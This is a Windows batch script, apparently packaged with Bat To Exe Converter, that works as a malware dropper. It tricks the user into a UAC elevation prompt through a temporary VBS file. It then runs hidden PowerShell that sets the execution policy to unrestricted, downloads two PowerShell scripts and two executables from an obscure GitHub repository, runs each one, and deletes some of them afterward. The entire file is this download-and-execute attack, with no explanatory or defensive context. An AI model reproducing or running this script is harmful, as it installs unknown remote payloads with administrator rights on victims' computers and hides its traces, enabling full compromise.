::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAhoaAuBKWa/CKEP1O710+WSoUUhcdcDfo7Q36aBIuwc8nrseoU5mH9Cnas=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges, press yes to continue...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
cd %TEMP%
Powershell -WindowStyle hidden -Command "Set-ExecutionPolicy unrestricted -Force; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/putamadre.ps1' -OutFile main.ps1; .\main.ps1; Remove-Item main.ps1; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/mierda.ps1' -OutFile yes.ps1; .\yes.ps1; Remove-Item yes.ps1; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/euserv.exe' -OutFile cli.exe; .\cli.exe; Invoke-Webrequest 'https://raw.githubusercontent.com/imsneek/gudytevbuyde65yvyu3ev4w5y/main/mainserv.exe' -OutFile server.exe; .\server.exe"